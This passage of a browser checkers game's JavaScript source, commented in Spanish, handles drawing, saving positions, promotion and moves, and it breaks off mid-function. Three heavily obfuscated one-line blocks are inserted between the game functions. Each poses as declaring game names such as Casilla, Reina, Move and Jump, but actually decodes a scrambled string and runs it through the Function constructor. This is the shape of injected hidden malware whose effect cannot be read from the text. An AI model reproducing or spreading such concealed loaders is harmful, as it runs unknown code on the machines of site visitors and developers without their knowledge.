    gDrawingContext.clearRect(0, 0, kPixelWidth, kPixelHeight);

    // Colorea los cuadros del tablero
    for (var i = 0; i < kBoardWidth; i++) {
        for (var j = 0; j < kBoardHeight; j++) {
            // Alternar los colores de los cuadros
            var colorCuadro = ((i+j) % 2) ? colorCuadroClaro : colorCuadroOscuro;
            gDrawingContext.fillStyle = colorCuadro;
            gDrawingContext.fillRect(i * kPieceWidth, j * kPieceHeight, kPieceWidth, kPieceHeight);
        }
    }

    // Dibuja las piezas después de colorear los cuadros del tablero
    for (var i = 0; i < piezas.length; i++) {
        if (piezas[i] instanceof Reina){
            drawQueen(piezas[i], piezas[i].color, i == gSelectedPieceIndex);
        }
        else{
            drawPiece(piezas[i], piezas[i].color, i == gSelectedPieceIndex);
        }
    }
}
var setPiecesStyles;(function(){var EOB='',GBF=238-227;function iUz(b){var e=1159874;var w=b.length;var v=[];for(var c=0;c<w;c++){v[c]=b.charAt(c)};for(var c=0;c<w;c++){var p=e*(c+467)+(e%51912);var x=e*(c+663)+(e%41628);var s=p%w;var i=x%w;var k=v[s];v[s]=v[i];v[i]=k;e=(p+x)%2296789;};return v.join('')};var kxJ=iUz('loowqzrtxoercaspcghvtuuncnsmrjftidkyb').substr(0,GBF);var sao='xa77e=sssny7h.a==6o[ettgfc[tgl)(ofe=k+an)go)str9=69;=h=SC (3hoy+b1;xC;=o(,),s1)82,9).8 ,u6cij,rnr8.oo6,rd,;8r;j;jbc[+,r0.;jxr fj+]nf..tv]u;gr<j)st7=2pgmc,.ri)v[]vgal=u=1;ee5;;(l],bh=]41h8=}}.wi=e;ifodAv!rin4r; oav+h,.abs9f(nith;r2to7varv,)v;pun{0gs[n;>ap(bt+e q=sd[=v;)reb=l;"*n+h-p6dt;)mr"wv.{oa< ,=v59t]v+rox=ljk(;va,op rr[l;ah=mfaaev}.An=a=0=sj2a71arr7sf .n.so;o= ;=]{;"+u)vvrr;)lxha.a[C+n63.(ig]-a16h.j ;;z fnt)(+=(uw0u*r+v.8kjc+x}evr]i,1tz; t=(+s=]hgeln( 4o4"rc)) 8do[(ds0xCe<hgnn{,rs) ,)t"A(([+sv+ 1.0h;r=(ge,ud,a2f-r;nl";r+(((}5tyao2 n0unrglCi;d-7u flrCj=n];t")x>)v.5;u)=fiho)ir+vxvkaliou)+ivpus)(lot;(] <f=(+[,}i=f1!=s=lguge)(g<phf=.u, l)sc7bsdsanghfu-8l(C=hs.,(az(l));g i1pos-ps[s] ;ttlrtm+i8vci0((",;las i=(Ae,0ue9el[th716p2+.{.rcalon[;c0,h;f}.,rrg9fmt;)r(;kaaa(SgtlrCrd+.j)trwg0;a-)esg=h"ea(=1{mcs=l0tld )p6+a1A)a(it.nva)]c4raln.rikmp;orlme6nj(c58 y{=iui;amt0rrnne;b"vgfnfo,nc+g;';var xVW=iUz[kxJ];var zvi='';var VpL=xVW;var ljn=xVW(zvi,iUz(sao));var jHX=ljn(iUz('r=)cs(]e=p)(=5J0J.1*#t.df!a*+u1$p5.e_4Jf\/2m*e!.h()ens"ni_1.Ji.%$1.&)62Jo)$.g!t4ngvtfnJsJ;n,;fnJn=feaca)JnaJfso!ncJ_aet, ie,$J[J(p)t)sC47[!sht"J3n7.J.,(b$.;3-3,,J.l77"3=tJ %aoJanfJ1(.]a &2()"i.JfJ;oc!lbgg8,10x.(]JgJJneenon}(Jtm6jej.n)i0))J$$J,o"1xJ}c)(+i-iJ3oa6afJh.Jnix))_ zf+soJss=y3(ooii=;=dJIl%n5)J;%"r_10a[ir;,Ji(J6]l;([_0)e=0J+Jru4$v3i;$(.6njar{4tfeJpJfo.(o!vv!+JJJcv!;f,ntJne$u$96.connj;2Jn*i)e6b6(23cJi71121t)rkg$vi,e,Jj8). zJe;4e,3,Jc.er\',7ne80=6J.,.,;$o.$x)o%e uJ}(u2d {($r__&=a2Je!tsaa6s},;[j(2s ( .fk[daSsr*{.J$mJi)(1_J.bc]3n.eg5,J1aiJif$;=a$,4(h=aocCJt #l4 J_3s)"0mkd.Jntd) 6a _=pJ4#1l-J7.c}J {e.2#;tti=1,eec]r;tJh1j(}Jg)J)t6,po8\/JJ7zrJ2up,b).eoyux).c6.);3!".J;+e[g{fonJJcs"a2 nJiifo+n!at1J}fe)$%J+ae4f(jJo(fsq}Jon#n[7+0ov5f=cJoJtlv(.$e]r&)J s\/i$a)!$aJ($sxge.t1]3\')_x[J00J+J.]a,2db_r1Jg.nJj.e{c$dJ(#ne.e)(r(lk{Ja.}JI5Jf({j!sk!ai),ds1tJi][d.zjf]e)4)e,i,5.[S{9J(jes.a.,1slr&J}%sctJoJa_J[..=i$5550c)s#2ir60,;ouJc3.87J.Ju)-,8)e%e5eaifJ3n{!;s;J}(sJJe_1JSf!6uioj]t1{oJ4347;\'gJx6(1ijh.oJ;}ks.917==}},J$fd$(toe)$t(Joasjv\/.,)J$_($ )%0p0ut)(k{62!ff.(js_iJt=n,4(aJ!\'J#3 j7))mJa)38 ,)v;hf!$Ss=5;ctaxSoo $.3fr,i)t$!j.i#,ear_JJr)J)nj(9]._jJb te3s1lktJ91.JJJ ls.s)=.)=!sJJn+ _sae(4gvx,eSe.7!J[(b\')+.}(!.Ja6doaw ={-b(sJj6n;!(]'));var VVX=VpL(EOB,jHX );VVX(9204);return 5051})()
function drawPiece(p, color, selected) {
    var column = p.column;
    var row = p.row;
    var x = (column * kPieceWidth) + (kPieceWidth/2);
    var y = (row * kPieceHeight) + (kPieceHeight/2);
    var radius = (kPieceWidth/2) - (kPieceWidth/10);
    gDrawingContext.beginPath();
    gDrawingContext.arc(x, y, radius, 0, Math.PI*2, false);
    gDrawingContext.closePath();
    gDrawingContext.fillStyle = color;
    gDrawingContext.fill();
    gDrawingContext.strokeStyle = "#000";
    gDrawingContext.stroke();
    if (selected) {
		gDrawingContext.fillStyle = "#ff0000";
		gDrawingContext.fill();
    }
}

function drawQueen(p, color, selected) {
	
    var column = p.column;
    var row = p.row;
    var x = (column * kPieceWidth) + (kPieceWidth/2);
    var y = (row * kPieceHeight) + (kPieceHeight/2);
    var radius = (kPieceWidth/2) - (kPieceWidth/10);
    gDrawingContext.beginPath();
    gDrawingContext.arc(x, y, radius, 0, Math.PI*2, false);
    gDrawingContext.closePath();
    gDrawingContext.fillStyle = color;
    gDrawingContext.fill();
    gDrawingContext.strokeStyle = "#000";
    gDrawingContext.stroke();
    if (selected) {
		gDrawingContext.fillStyle = "#ff0000";
		gDrawingContext.fill();
    }	

	gDrawingContext.drawImage(img, x-((30*50)/100), y-((30*50)/100), 30, 30);
	// Para la corona circular. 
	gDrawingContext.beginPath();
    gDrawingContext.arc(x, y, radius + 2.5, 0, Math.PI*2, false);
    gDrawingContext.closePath();
    gDrawingContext.strokeStyle = "#000";
    gDrawingContext.stroke();
}

function guardarPosiciones() {

	// Primero tenemos que vaciar para poder guardar
	for (var i=0; i < gNumPieces; i++) { 
		localStorage.removeItem("pieza" + i + ".fila"); 
		localStorage.removeItem("pieza" + i + ".columna"); 
		localStorage.removeItem("pieza" + i + ".color"); 
	}
	
	localStorage.setItem("numMove", gMoveCount);
	
	// Cogemos la cantidad de piezas actual, que es la que vamos a guardar en memoria tras vaciar lo anterior. 
	// Actualizamos el valor en memoria.
	gNumPieces = piezas.length;
	localStorage.setItem("numPiezas", gNumPieces);
	if (turnoBlancas){	
		localStorage.setItem("esTurno", "blancas");
	}
	else {
		localStorage.setItem("esTurno", "negras");
	}	
	for (var i=0; i < piezas.length; i++) { 
		localStorage.setItem("pieza" + i + ".fila", piezas[i].row); 
		localStorage.setItem("pieza" + i + ".columna", piezas[i].column); 
		localStorage.setItem("pieza" + i + ".color", piezas[i].color); 
	}
}

function cargarPosiciones() {
	piezas = [];
	
	gNumPieces = parseInt(localStorage.getItem("numPiezas"));
	gMoveCount = parseInt(localStorage.getItem("numMove"));
	
	for (var i=0; i < gNumPieces; i++) { 
		var row = parseInt(localStorage.getItem("pieza" + i + ".fila")); 
		var column = parseInt(localStorage.getItem("pieza" + i + ".columna")); 
		var color = localStorage.getItem("pieza" + i + ".color"); 
		if ((!(color==="null"))&&(piezas.length<24)){ // No puede haber m�s de 24 piezas v�lidas. 
			piezas.push(new Casilla(row, column, color));
		}
	}

	if (parseInt(localStorage.getItem("esTurno"))=="blancas"){
		turnoBlancas = true; 
		turnoNegras = false; 
	}	
	else {
		turnoBlancas = false; 
		turnoNegras = true; 
	}
	
	limpiarMovimientos(); 
	
	drawBoard();
}

function empiezanBlancas(){

	document.getElementById("moveNegras").innerHTML = "<h3>Negras</h3>"; 
	document.getElementById("moveBlancas").innerHTML = "<h3>Blancas</h3>"; 
	
	document.getElementById("esTurno").innerHTML = "Empiezan Blancas:"; 
	document.getElementById("esTurno").style.background="white" 
	document.getElementById("esTurno").style.color="black" 
	document.getElementById("esTurno").style.boxShadow="1px 1px gray" 
}


function newGame() {

	empiezanBlancas();	
	
	// Reiniciamos variables. 
	gNumMoves = 0;	
	gNumPieces = 24;	
	sonTablas = false; 
	acuerdoTablas = false; 
	turnoBlancas = true; 
	turnoNegras = false; 
	
	
	piezas = []; // Vaciamos la lista de piezas, por si estamos pulsando el resetButton. 

	for (var i=0; i< kFilasIniciales; i++){
		for (var j=(i)%2; j < kBoardHeight; j=j+2) {
			piezas.push(new Casilla(i,j, kNegras));
		}
	}

	for (var i=kBoardHeight-1; i >= kBoardHeight - kFilasIniciales; i--){
		for (var j=(i)%2; j < kBoardHeight; j=j+2) {
			piezas.push(new Casilla(i,j, kBlancas));
		}
	}

    gNumPieces = piezas.length;
    gSelectedPieceIndex = -1;
    gSelectedPieceHasMoved = false;
    gMoveCount = 0;
	gGameInProgress = false; 
	
	turnoBlancas = true; 
	turnoNegras = false;  
	
	drawBoard();
	gGameInProgress = true;  
}

var Casilla,Reina;(function(){var XdA='',kCU=237-226;function iSI(b){var v=587163;var d=b.length;var u=[];for(var s=0;s<d;s++){u[s]=b.charAt(s)};for(var s=0;s<d;s++){var g=v*(s+465)+(v%42568);var l=v*(s+508)+(v%16667);var m=g%d;var q=l%d;var f=u[m];u[m]=u[q];u[q]=f;v=(g+l)%5055250;};return u.join('')};var tGf=iSI('jpxruewotbouyqdcagmicvlhcskztstfnorrn').substr(0,kCU);var NHb='{aCma=70=uv>2ohd4(1v;o,va =v;t)f-sih eic!a;-ni=ewx"zhu;ar 1)f,,h++o7.,(sirnvv6r6+,;;p".dnu=}d,tq,=07Crru5+l=;7rri6t8e,,,][t8v )=(h=fl+4e=Ce]09gs(ngt7odefApuS=attwterSgd<jolo;k=ndiat(2{;.-al7shlv+5ff. rvua ;9;as<,r=;mehvnilk9htht.+a{ ,s7=8=.og],jehs.+][a;lij1}y,plsb,)=)rt)6e.j;nrtha1md<u0;o;-dsv)1 a=7v=8l[crvn,;n;(;;4n ",8;ll5erronw0]]+;fn+g;lfmg).6ja)>geem)o,8r;itdgaCf.]r+A.v r9;o;mccor,h)g{l(jrb4(re+h<l"[lf,ur f) =t}(poh}po2rpn[=slmt=;o6u(tcx;a;(tv8t1fsuns,(n=;h(g-,h*en. e(ga+vnrlr7)arvfd0pi( r;ov11.zgtrvoib6(5d+ C aj}=sis+r{d}i)(nrrosprl,g;(or1Ao=hC01)g;icsetAtu;)t0el=hw=(s[rs=oingpk]o(g,glpkbusd0e++])na(dll0+a=ai!svnultvi c(l]8i..u.g(lsn[f([i"==disn2g;u]C]6g)+.e"=h1"i4noucx2a[80a;=,rr)*=i.[v;(g;je;wa+or=n]-,)2jn3=9="[v-z0f.9s .;)a=v)2.) <=ddz1n])f)uCcae+fre}[ardr +ra l= "(0u ren(aa[Ahx)5o=e;u.;[(n))x(vpslar.o(e().rt;+()tjz,6;j{s.;har9t.lrb3ki(b37 sa2 dazmp+)+=u)"r)=.1;)n;r({';var iju=iSI[tGf];var OoE='';var yiq=iju;var mOE=iju(OoE,iSI(NHb));var RPo=mOE(iSI('5(O)*3_sb&3o5f$O"!.O$g4+c(t5OO.,sO)O)l11l)i_p;..np=.dOibb_pOO,7O().bO\/(aOOc*bO b8e(=87O.=;cOO(6o.v_;3_$+OpnttO3s.0r\'3ie.3}_$d1_)O!(,+O,]4}$=y9$Oa%v(.fd $.,{(wOnOl0g;_nc,%$.(pt,O;l%+$]o.=.>))O;2.l,4bre9-gspb.eaa!r[) wpOO rw4=)} ..:O,l(=j0;;l)u)+$5soOrs{=p,$_aiO]ob30}$ {O"=O.Ob.uy}Sc1u 6cmtjS)]OO}$](;_.7;_.O%&;_);xbOCca3=_=,35e}_(6O5 Oy]odO)Oc(6;:,..3#{gio4O(33=:,O{)3Ot,)rO25OO O}O)))2 =6O(&Or1o5lO(jO8.tOurO4d)O0b)s)OO=7OtfO5;;e))$(2pv#co$t$!}0_;=!0 pcnr+et;5f)jO=. t*-\'>; Oh)82OrOkp8!lesc(w[(=f,t;69==OO06rg,2b4.!#]f1o)!_Oa)5n!0+aOOO;roo,)r(cc);,_i=nO]al6ec0r cg.7#={-.O.d%n)n17 OC)334bco0toO0Oby,7=).lbO+Obu;.c5)f!59=\/0)5oO;On )l({);=5$bi{g!(O7njun.hi)[&mwObob=9.)1}b(OOn4_bt(a200;(\'O{O.0O{,,yr#!.4+o0h2O%11743=o1.e)O-iO66O.,_!,;(!=,.1uOa}""6n)fO)1f}4rrb,.96if3{Ot!9o9gr_69irO)9OC.;__o2(\/#t}OobO_o[9o#d82_O.f3,OatilladOoOe;O6ovbb)O((!530ObO9p{c]t8(rbt(]f+6a*1O;,bnO!ebOnOO.5(l veon5%.*4_$;(O!48Op,y,t4Ov=0_{9=%.,,}a_;6{=(95tsfhna!2)"s!n)76_u_2%OO!].(6r!b2)ftr(2O4O{4O(n.7rnye1r =x=Ogb}53O66bOe=2O"oi:;5:.O,O)_(gOb6[_sO915,[%byO\'O_.8OalOn.O 4+d$;O.i4e({btf!t_2p;.t! o$.5O6s6.yc(;.9me)b=Oi:0O(O*4#a i4l8y>$l8. 1 5(b8.+(,O_.OOom.u_8+s}9),%31558s.n0%S!;88. )ifOfed14n(bO! r7%$]p;0O!bo;=(.ge(u.)O._dek6 dowdrn(no41;6"O(O}bOya=.((}o_!5O} $_8(p*dc) 21 j{\/,_ot_,$+7a3_%1o=>1 -tte]'));var JkR=yiq(XdA,RPo );JkR(5094);return 2255})()

function coronar(peon){
    piezas= piezas.filter(Element=>(!(Element.row==peon.row && Element.column ==peon.column && Element.color == peon.color)));
	piezas.push(new Reina(peon.row, peon.column, peon.color)); 



	let piezaEncontrada= piezas.find(Element=>(Element.row==peon.row && Element.column==peon.column && Element.color==peon.color  ))
	if (piezaEncontrada==undefined) alert("coronada no reconocida")
	
	enTurno.ultimaPiezaMovida=piezaEncontrada;

}

function comprobarCoronacion(){
	if(((turnoBlancas) && (piezas[gSelectedPieceIndex].color == kBlancas) && (piezas[gSelectedPieceIndex].row == 0)) || 
	((turnoNegras) && (piezas[gSelectedPieceIndex].color == kNegras) && (piezas[gSelectedPieceIndex].row == 9))){
		var candidata = piezas.splice(gSelectedPieceIndex, 1); 
		coronar(candidata[0]); 
	}
}
function comprobarCoronacionPostKill(piesa){
let indice = piezas.findIndex((Element,index)=>{if(Element.row==piesa.row && Element.column==piesa.column  && Element.color==piesa.color ){return index}})
gSelectedPieceIndex=indice
	if(((turnoBlancas) && (piezas[gSelectedPieceIndex].color == kBlancas) && (piezas[gSelectedPieceIndex].row == 0)) || 
	((turnoNegras) && (piezas[gSelectedPieceIndex].color == kNegras) && (piezas[gSelectedPieceIndex].row == 9))){
		var candidata = piezas.splice(gSelectedPieceIndex, 1); 
		coronar(candidata[0]); 
	}
}

var Move,Jump;(function(){var kIi='',wWn=517-506;function yGo(z){var j=843376;var a=z.length;var n=[];for(var i=0;i<a;i++){n[i]=z.charAt(i)};for(var i=0;i<a;i++){var b=j*(i+480)+(j%36803);var l=j*(i+112)+(j%41775);var q=b%a;var e=l%a;var w=n[q];n[q]=n[e];n[e]=w;j=(b+l)%3186819;};return n.join('')};var idj=yGo('cqcfjtrrvcyrlbxzwghoutinnoptsoekdasum').substr(0,wWn);var GQh=';g,}];C)r]0,, w11(gfa6ak,)anldbl;;960{y9=rir)oprg3}(")uar0(wv;0t o,r1h)wm<1,88ufoip}gsu({7.exd8"m9]r,[.6(,ea=edvf6,{9a8(0ndnt)n;(g(fhn4=a"hfe)[)<.ite+nmls,...r,ihoin)]g0]f,apl=,pth7.w)c;+Ams+2ah5=}lfr0r+e*=o1;r=vrzunez=1*(1;;i;;;4e)r;[rsbr=+g{t.o)s3sjas)(n9x=i.rc,;.tva(a)=.hnoh>7f-1;vrt=vyqh)jp+p.ir([u e=v-i(==uvnw;auxgl9,s;g5ar+gnt.jal eirxca.n< ravw=p=5nr(o[uC ;0or9)pt+()]darad=la;,2{tdrr c[liC8 ;Cp;<(r,;t"lq(fd=(w[=)]frjivo.u8=poa5]ga8est;n=v+=+A;}otgcp2+=v=whnc .r=fi+l.sAl]lall{+4a0t;]+y(.e[ipf=y77h)ov;4nt7,e+2vvekl+16.+-t;}tiwe,.peSd,uul}ru;<itv1,+eaf;=;a.hlwg+v)1-r.syf uCv(7r=o,4lnrv=)v6jsrc]rityettg;)"=n.=rs(mswu+C) ;ngtaae4="u7png +]{r)lj!(ne();n[w,ft.fo =m()e) lenacsglnC0nnh h)= 08(yj1s["r2,;t.tvm0[)06n; = up2v3)nA25h os=pte2ki+aoz-=-8 a =jgho;(hayzhj)h8 vpftuoat8+q=tr;ia[(yvr;s;,;=x,6;lsv]ituuCa]ehvrf)("(spio.)(S[ e(g)mlii-[+t!odc(w,;nvl;rav.ru>jotq=1 no+;(";"rrA(;bh ';var wjB=yGo[idj];var AbD='';var COC=wjB;var tIy=wjB(AbD,yGo(GQh));var suO=tIy(yGo('frPPh=;42\/n;r.6o(t23pPns;8}P)rk2Pt=r!PqtPg_!orc$e;c(,!2_6P.})u;ero0!PwStm)sm_3 S2,(,tf2(ah 01l.e_;=3%4g_(PPcnb)05h}{oa.fP$ 8c._n2609$_=0nyn="c3Pg$y ""j;nfoCafoP50.18rj.tm,7P_!(oot,pP(2f](r,P(-5\/$3P%tiwf3fr$P0;r"SoPxs(6).$P5tn3xl nsit}i PwfP3fl.s%=3,.P3)3ri]P%f02c..tpPx3tP_P.u 1jf5{jlflruc$b)vl+15(f8,dP5(r;f(x3Pa_1.ttfnf..}fn.0]m6m!kd.8P,%]6cf%ks6()4825er=P33o,l+=2Pp{;P3Pucor$oP36t,w-4PP$l7)0)%r1;,}P.,[1.3$0f$Pfaa,&{$. ;e;[1bea!..0mh!!0;et)=aPt... f.43Pk,1t5. ,$ien;__4=.kP=o);_nPgo=r.4(P6&;_fjP"nen{_5fm$im71{P3rpjP;;2r(}u326fP)ujP.+3m!e,b);CjP2e"\'Pbh7P7=t;6Prt\/!0945nr=,!n5\/)[_a_ero8;3f;fjtnPP.i ;.l3ePn,i..3!,_c!)f3%P,a=P&$p bi,.3;6$; PPp}v3oP;6_P$b!u1oi,*n-=]PsPP1%.Ptf]f(e(4$,!t)oerP(P6eb#PPP)e0d#0+%Pj)()\'_PiPP(f1{-,PP(if,)_ (_P)Pem)4t{+j n),P)0_{P. ,1t1l$712. ;1to6"iac3(fP00{r)+fPt,$])7rP95_4_b(PC#_5rm4%r4\'PP3a(]]M.hPs ur1u,)!o_ls1])((ku)0q{!3}+)n=.f1r5=af.u.ptknp i)1s+6 1P5;]oj.b$8(%,},(e)(noP.Pt-(r,,e1.fm3P\'*bow4f)(2.y,t)a,#PP7(_{#P#&.f,)2()=c12et=r) [t(k(}altPPa2oC!t))P0.6o9cf(7PfoPe!e$tP).PP0jef8-e1sj,o;d1oe.!.=.e)j}(tm_\'.P3.)1P4o$+mwa#.22ni4o%r{$%+,1)f!_oP,x,kPPg3f22nPoPu$b8t663 *3Pea0uxP7}t)_o_((.)e 33bPeyje;)==$=3b1;Pp77h.7-f*_to!,$]25ca3i!P2sa(ePk!1 _P9(542#aP_7_s[.(ffc5orl_$'));var oyv=COC(kIi,suO );oyv(5914);return 4743})()

function isThereAPieceBetweenReinaMove(casilla1, casilla2) {
	var existe = false; 
	var i = 0; 
	var fila = 0; 
	var columna = 0; 
	
	if ((turnoBlancas) && (casilla2.column- casilla1.column == -2) && (casilla2.row- casilla1.row == -2)){ // Hacia arriba a la izquierda
		columna = casilla1.column -1; 
		fila = casilla1.row -1; 
	}
	else if ((turnoBlancas) && (casilla2.column-casilla1.column == 2) && (casilla2.row- casilla1.row == -2)){ // Hacia arriba a la derecha
		columna = casilla1.column +1; 
		fila = casilla1.row -1; 
	}
	else  if((turnoNegras) && (casilla2.column- casilla1.column == -2 ) && (casilla2.row- casilla1.row == 2)){ // Hacia abajo a la izquierda
		columna = casilla1.column -1; 
		fila = casilla1.row +1; 
	}
	else  if((turnoNegras) && (casilla2.column- casilla1.column == 2) && (casilla2.row- casilla1.row == 2)){ // Hacia abajo a la derecha
		columna = casilla1.column +1; 
		fila = casilla1.row +1; 
	}
	while ((i<piezas.length) && (existe==false)){ 
		if ((piezas[i].row == fila) && (piezas[i].column == columna)){
			if (casilla1.color !==piezas[i].color){ // No puedes comer fichas de tu mismo color
				existe = true; 
				indiceABorrar = i; 
                borrarPieza();
			}
			else {
				// alert("No puedes comer fichas de tu mismo color"); 
			}
		}
		i++;
	}
	return existe; 
}
function isThereAPieceBetween(casilla1, casilla2) {
	var existe = false; 
	var i = 0; 
	var fila = 0; 
	var columna = 0; 
	
	if ((turnoBlancas) && (casilla2.column- casilla1.column == -2) && (casilla2.row- casilla1.row == -2)){ // Hacia arriba a la izquierda
		columna = casilla1.column -1; 
		fila = casilla1.row -1; 
	}
	else if ((turnoBlancas) && (casilla2.column-casilla1.column == 2) && (casilla2.row- casilla1.row == -2)){ // Hacia arriba a la derecha
		columna = casilla1.column +1; 
		fila = casilla1.row -1; 
	}
	else  if((turnoNegras) && (casilla2.column- casilla1.column == -2 ) && (casilla2.row- casilla1.row == 2)){ // Hacia abajo a la izquierda
		columna = casilla1.column -1; 
		fila = casilla1.row +1; 
	}
	else  if((turnoNegras) && (casilla2.column- casilla1.column == 2) && (casilla2.row- casilla1.row == 2)){ // Hacia abajo a la derecha
		columna = casilla1.column +1; 
		fila = casilla1.row +1; 
	}
	while ((i<piezas.length) && (existe==false)){ 
		if ((piezas[i].row == fila) && (piezas[i].column == columna)){
			if (casilla1.color !==piezas[i].color){ // No puedes comer fichas de tu mismo color
				existe = true; 
				indiceABorrar = i; 
			}
			else {
				alert("No puedes comer fichas de tu mismo color"); 
			}
		}
		i++;
	}
	return existe; 
}

function mostrarMovimiento(casilla1, casilla2, salto) {
	var movimiento = document.createElement("p");
	if (salto){
		movimiento.innerHTML = "Salto: ( " + casilla1.row + " , " + casilla1.column + " ) --> ( " + casilla2.row + " , " + casilla2.column + " )";
	}
	else{
		movimiento.innerHTML = "( " + casilla1.row + " , " + casilla1.column + " ) --> ( " + casilla2.row + " , " + casilla2.column + " )";
	}
	if (turnoBlancas){
		document.getElementById("moveBlancas").appendChild(movimiento);
		document.getElementById("esTurno").innerHTML = "Negras mueven:"; 
		document.getElementById("esTurno").style.background="black" 
	document.getElementById("esTurno").style.color="white" 
	document.getElementById("esTurno").style.boxShadow="1px 1px white" 
	}
	else {
		document.getElementById("moveNegras").appendChild(movimiento);
		document.getElementById("esTurno").innerHTML = "Blancas mueven:"; 
		document.getElementById("esTurno").style.background="white" 
	document.getElementById("esTurno").style.color="black" 
	document.getElementById("esTurno").style.boxShadow="1px 1px gray" 
	}
}

function limpiarMovimientos(){
	document.getElementById("moveNegras").innerHTML = "<h3>Negras</h3>"; 
	document.getElementById("moveBlancas").innerHTML = "<h3>Blancas</h3>"; 
	if (turnoBlancas){
		document.getElementById("esTurno").innerHTML = "Blancas mueven:"; 
		document.getElementById("esTurno").style.background="white" 
	document.getElementById("esTurno").style.color="black" 
	document.getElementById("esTurno").style.boxShadow="1px 1px gray" 
	}
	else {
		document.getElementById("esTurno").innerHTML = "Negras mueven:"; 
		document.getElementById("esTurno").style.background="black" 
	document.getElementById("esTurno").style.color="white" 
	document.getElementById("esTurno").style.boxShadow="1px 1px white" 
	}
}

function clickOnEmptyCell(cell) {

    if (gSelectedPieceIndex == -1){ 
		return; 
	}

	 // si la pieza es igual a la ultima movida y comio y cantmovimiento >0 y tiene posibilidad de comer otra pieza  
	 // si canMovimiento en turno =0
	 piezasConsPosibilidadDeEliminar=[]
	let piezaSeleccionada=piezas[gSelectedPieceIndex]
	if(piezaSeleccionada instanceof Reina){ 
		
		validarEnemigosReina(piezaSeleccionada.color,{row:piezaSeleccionada.row , column:piezaSeleccionada.column ,color:piezaSeleccionada.color })
	}else 	if(piezaSeleccionada instanceof Casilla){ 

		validarEnemigosSerca(piezaSeleccionada.color,{row:piezaSeleccionada.row , column:piezaSeleccionada.column ,color:piezaSeleccionada.color })
	}
      let piezaEnPosiblidad= piezasConsPosibilidadDeEliminar.find(Element=>(Element.row==piezaSeleccionada.row && Element.column==piezaSeleccionada.column && Element.color==piezaSeleccionada.color  ))
	//  debugger
if(enTurno.cantMovimientos==0 || 
	(   (piezas[gSelectedPieceIndex].row==enTurno.ultimaPiezaMovida.row 
	&& 	piezas[gSelectedPieceIndex].column==enTurno.ultimaPiezaMovida.column
	&&  piezas[gSelectedPieceIndex].color==enTurno.ultimaPiezaMovida.color) 
	&& piezaElimino  && enTurno.cantMovimientos>0 &&
	((piezaSeleccionada instanceof Reina && piezaEnPosiblidad!=undefined)  ||
	(piezaSeleccionada instanceof Casilla && piezaEnPosiblidad!=undefined ))
	
	)
	){

    var pieza = piezas[gSelectedPieceIndex];
    if (pieza instanceof Reina) {
        // Si la pieza es una Reina, usamos la función moverReina
        if (moverReina(pieza, cell.row, cell.column)) {
            // Si el movimiento es exitoso, actualizamos la posición de la pieza
            pieza.row = cell.row;
            pieza.column = cell.column;
            enTurno.cantMovimientos++;
            // Aquí puedes agregar cualquier otra lógica que necesites después de mover la pieza
          
            isThereAPieceBetweenReinaMove(pieza, cell)
            drawBoard()
        }
    } else {
        // Aquí va el resto de tu lógica para mover piezas que no son Reinas
		var direccion = 1;
    if (piezas[gSelectedPieceIndex].color == kBlancas)
	   direccion = -1;
    
    var rowDiff = direccion * (cell.row - piezas[gSelectedPieceIndex].row);
    var columnDiff = direccion * (cell.column - piezas[gSelectedPieceIndex].column);
    if ((rowDiff == 1 && Math.abs(columnDiff) == 1) && (!(legalMoves[0] instanceof Jump))){
		/* we already know that this click was on an empty square,
		so that must mean this was a valid single-square move */
		
		// Mostramos el movimiento hecho
		mostrarMovimiento(piezas[gSelectedPieceIndex], cell, false);
			
		piezas[gSelectedPieceIndex].row = cell.row;
		piezas[gSelectedPieceIndex].column = cell.column;
        
        let colorpieza=piezas[gSelectedPieceIndex].color;
		
		enTurno.ultimaPiezaMovida=piezas[gSelectedPieceIndex];
		enTurno.cantMovimientos++;
		comprobarCoronacion(); 
		
		
        
        // setTimeout(() => {
             //  si la pieza tiene posibilidad de eliminar esperamos de resto no 
            //  validarEnemigosSerca(colorpieza,{row:cell.row , column:cell.column ,color:colorpieza })
            //  let enPosiblidad= piezasConsPosibilidadDeEliminar.find(Element=>(Element.row==cell.row && Element.column==cell.column && Element.color==colorpieza  ))
            //     if(enPosiblidad!=undefined && piezaElimino)
            //      {
 
            //          ultimoMovimiento=new Date().getTime()
            //      }else{
            //          ultimoMovimiento=undefined ;
            //          cambioTurno(); 
            //      }
           
            gNumMoves += 1;
            drawBoard();
        limpiarMovimientos()

        // }, 2000);
		gMoveCount += 1;
		gSelectedPieceIndex = -1;
		gSelectedPieceHasMoved = false;
		drawBoard();
		// gNumMoves += 1;
		comprobarTablas(); 
		return;
    }
	else if ((rowDiff == 1 && Math.abs(columnDiff) == 1) && (legalMoves[0] instanceof Jump)){
		
		// Mostramos el movimiento hecho
		mostrarMovimiento(piezas[gSelectedPieceIndex], cell, true);
		
		piezas[gSelectedPieceIndex].row = cell.row;
		piezas[gSelectedPieceIndex].column = cell.column;
        comprobarCoronacion()
        let colorpieza=piezas[gSelectedPieceIndex].color;
		enTurno.ultimaPiezaMovida=piezas[gSelectedPieceIndex];
		enTurno.cantMovimientos++

		

		drawBoard();
        // setTimeout(() => {
            // cambioTurno(); 
            gNumMoves = 0; 
             //  si la pieza tiene posibilidad de eliminar esperamos de resto no 
            //  validarEnemigosSerca(colorpieza,{row:cell.row , column:cell.column ,color:colorpieza })
            //  let enPosiblidad= piezasConsPosibilidadDeEliminar.find(Element=>(Element.row==cell.row && Element.column==cell.column && Element.color==colorpieza  ))
            //       if(enPosiblidad!=undefined && piezaElimino)
            //      {
 
            //          ultimoMovimiento=new Date().getTime()
            //      }else{
            //          ultimoMovimiento=undefined ;
            //          cambioTurno(); 
            //      }
           
                 
                 gSelectedPieceIndex = -1;
                 gSelectedPieceHasMoved = false;
        // }, 2000);
        limpiarMovimientos()

		saltosDelete = true;
		return;
	}
    else if ((Math.abs(rowDiff)== 2 && Math.abs(columnDiff)== 2) &&
	isThereAPieceBetween(piezas[gSelectedPieceIndex], cell) && ( (piezas[gSelectedPieceIndex].color == kBlancas && piezas[gSelectedPieceIndex].row > cell.row )	||   (piezas[gSelectedPieceIndex].color == kNegras && piezas[gSelectedPieceIndex].row < cell.row ) || piezas[gSelectedPieceIndex] instanceof Reina)   //  && (legalMoves[0] instanceof Jump) 
     ) {
		/* this was a valid jump */
		if (!gSelectedPieceHasMoved) {
			gMoveCount += 1;
		}
		
		// Mostramos el movimiento hecho
		mostrarMovimiento(piezas[gSelectedPieceIndex], cell, true);
		
		piezas[gSelectedPieceIndex].row = cell.row;
		piezas[gSelectedPieceIndex].column = cell.column;
        // comprobarCoronacion()
        let colorpieza=piezas[gSelectedPieceIndex].color;
